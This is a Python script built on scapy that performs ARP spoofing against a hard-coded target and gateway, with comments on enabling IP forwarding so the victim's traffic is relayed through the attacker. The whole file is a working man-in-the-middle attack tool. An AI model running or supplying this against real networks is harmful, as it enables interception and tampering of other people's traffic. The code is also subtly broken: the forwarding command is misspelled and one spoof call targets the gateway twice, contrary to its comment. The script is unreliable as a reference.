#This program is improved version of ARPSpoof.py (Works with python 3 only)
#After the code starts executing, enter the following command in terminal: ech0 1 > /proc/sys/net/ipv4/ip_forward
#The above command is used to enable packet forwarding from this device. Else, packet forwarding does not occur and target machine will not be connected to internet


#! /usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose= False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet= scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose= False)


target_ip = "10.0.2.11"
gateway_ip = "10.0.2.1"
sent_packets_count=0

try:
    while True:
        spoof(target_ip, gateway_ip) # Telling the target ip that we are the router
        spoof(gateway_ip, gateway_ip) # Telling the router that we are target machine
        sent_packets_count=sent_packets_count+2
        print("\r [+] Packets Sent: " + str(sent_packets_count), end=""),  #\r indicates print in same line
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+} Detected Ctrl+C....Quitting......")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
